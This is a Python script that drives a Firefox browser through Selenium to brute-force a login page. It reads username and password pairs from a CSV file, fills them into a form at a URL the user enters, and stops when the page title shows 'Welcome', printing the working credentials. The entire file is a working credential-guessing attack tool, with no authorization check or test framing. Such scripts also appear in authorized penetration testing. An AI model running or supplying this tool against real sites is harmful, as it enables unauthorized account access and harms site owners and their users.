from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time
import requests
import csv
from bs4 import BeautifulSoup

def brute_force_login(csv_file_path, url):
    def get_fields(driver):
        #print(driver.page_source)
        try:
            input_tags = driver.find_elements(By.TAG_NAME, 'input')
            if not input_tags:
                print("No input tags found on the page.")
            for input_tag in input_tags:
                print(input_tag.get_attribute('outerHTML'))  # Print the full input tag HTML
        except Exception as e:
            print(f"An error occurred while retrieving input fields: {e}")
    def load_credentials_from_csv(file_path):
        credentials = []
        try:
            with open(file_path, mode='r', newline='') as file:
                reader = csv.DictReader(file)
                for row in reader:
                    username = row['username']
                    password = row['password']
                    credentials.append((username, password))
        except Exception as e:
            print(f"An error occurred: {e}")
        return credentials

    def attempt_login(driver, username, password, username_field, password_field):
        try:
        #     WebDriverWait(driver, 10).until(
        #  EC.visibility_of_element_located((By.ID, username_field))
            WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.NAME, username_field))
            )
            username_input = driver.find_element(By.NAME, username_field)
            username_input.clear()
            username_input.send_keys(username)

            WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.ID, password_field))
            )
            password_input = driver.find_element(By.ID, password_field)
            password_input.clear()
            password_input.send_keys(password)

            submit_button = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.XPATH, "//input[@type='submit']"))
            )
            submit_button.click()

            time.sleep(3)

            # Check for successful login - adjust based on your application
            if "Welcome" in driver.title:
                print(f"Login successful with username: {username} and password: {password}")
                return True
            else:
                return False

        except Exception as e:
            print(f"An error occurred: {e}")
            return False

    # Initialize WebDriver
    driver = webdriver.Firefox()
    driver.get(url)
    time.sleep(3)

    # Retrieve login page fields
    print(f"Retrieving login page from: {url}")
    get_fields(driver)

    # Load credentials from CSV
    credentials = load_credentials_from_csv(csv_file_path)
    print(credentials)

    username_field = input("Enter the ID of the username field: ").strip()
    password_field = input("Enter the ID of the password field: ").strip()

    # Iterate through the credentials
    for item in credentials:
        print(f"Attempting login with username: {item[0]} and password: {item[1]}")
        if attempt_login(driver, item[0], item[1], username_field, password_field):
            break

    driver.quit()  # Close the WebDriver
    print("Done")

if __name__ == "__main__":
    csv_file_path = 'Resources/credentials.csv'
    url = input("Enter the URL of the login page: ").strip()
    brute_force_login(csv_file_path, url)
